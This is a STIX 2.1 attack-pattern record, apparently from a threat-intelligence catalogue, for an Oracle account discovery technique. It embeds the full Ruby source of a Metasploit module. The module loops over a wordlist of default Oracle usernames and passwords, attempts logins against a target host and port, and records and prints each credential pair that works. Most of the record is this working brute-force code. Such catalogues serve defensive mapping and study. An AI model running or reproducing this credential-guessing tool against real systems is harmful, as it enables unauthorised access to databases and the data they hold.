{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--a9b2cb2e-ceb6-4116-8f74-93f1a199e963",
    "created": "2024-08-14T16:22:53.070372Z",
    "modified": "2024-08-14T16:22:53.070377Z",
    "name": "Oracle Account Discovery",
    "description": " This module uses a list of well known default authentication credentials to discover easily guessed accounts. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/auxiliary/admin/oracle/oracle_login.rb",
            "external_id": "oracle_login.rb"
        },
        {
            "source_name": "reference",
            "url": "http://www.petefinnigan.com/default/oracle_default_passwords.csv"
        },
        {
            "source_name": "reference",
            "url": "https://seclists.org/fulldisclosure/2009/Oct/261"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nrequire 'csv'\n\nclass MetasploitModule < Msf::Auxiliary\n  include Msf::Auxiliary::Report\n  include Msf::Exploit::ORACLE\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'Oracle Account Discovery',\n      'Description'    => %q{\n        This module uses a list of well known default authentication credentials\n        to discover easily guessed accounts.\n      },\n      'Author'         => [ 'MC' ],\n      'License'        => MSF_LICENSE,\n      'References'     =>\n        [\n          [ 'URL', 'http://www.petefinnigan.com/default/oracle_default_passwords.csv' ],\n          [ 'URL', 'https://seclists.org/fulldisclosure/2009/Oct/261' ],\n        ],\n      'DisclosureDate' => '2008-11-20'))\n\n      register_options(\n        [\n          OptPath.new('CSVFILE', [ false, 'The file that contains a list of default accounts.', File.join(Msf::Config.install_root, 'data', 'wordlists', 'oracle_default_passwords.csv')]),\n        ])\n\n      deregister_options('DBUSER','DBPASS')\n\n  end\n\n  def report_cred(opts)\n    service_data = {\n      address: opts[:ip],\n      port: opts[:port],\n      service_name: opts[:service_name],\n      protocol: 'tcp',\n      workspace_id: myworkspace_id\n    }\n\n    credential_data = {\n      origin_type: :service,\n      module_fullname: fullname,\n      username: opts[:user],\n      private_data: opts[:password],\n      private_type: :password\n    }.merge(service_data)\n\n    login_data = {\n      last_attempted_at: Time.now,\n      core: create_credential(credential_data),\n      status: Metasploit::Model::Login::Status::SUCCESSFUL\n    }.merge(service_data)\n\n    create_credential_login(login_data)\n  end\n\n  def run\n    return if not check_dependencies\n\n    list = datastore['CSVFILE']\n\n    print_status(\"Starting brute force on #{datastore['RHOST']}:#{datastore['RPORT']}...\")\n\n    fd = CSV.foreach(list) do |brute|\n      datastore['DBUSER'] = brute[2].downcase\n      datastore['DBPASS'] = brute[3].downcase\n\n      begin\n        connect\n        disconnect\n      rescue ::OCIError => e\n        if e.to_s =~ /^ORA-12170:\\s/\n          print_error(\"#{datastore['RHOST']}:#{datastore['RPORT']} Connection timed out\")\n          break\n        else\n          vprint_error(\"#{datastore['RHOST']}:#{datastore['RPORT']} - LOGIN FAILED: #{datastore['DBUSER']}: #{e.to_s})\")\n        end\n      else\n        report_cred(\n          ip: datastore['RHOST'],\n          port: datastore['RPORT'],\n          service_name: 'oracle',\n          user: \"#{datastore['SID']}/#{datastore['DBUSER']}\",\n          password: datastore['DBPASS']\n        )\n        print_good(\"Found user/pass of: #{datastore['DBUSER']}/#{datastore['DBPASS']} on #{datastore['RHOST']} with sid #{datastore['SID']}\")\n      end\n    end\n  end\nend\n",
    "x_mitre_disclosure_date": "2008-11-20"
}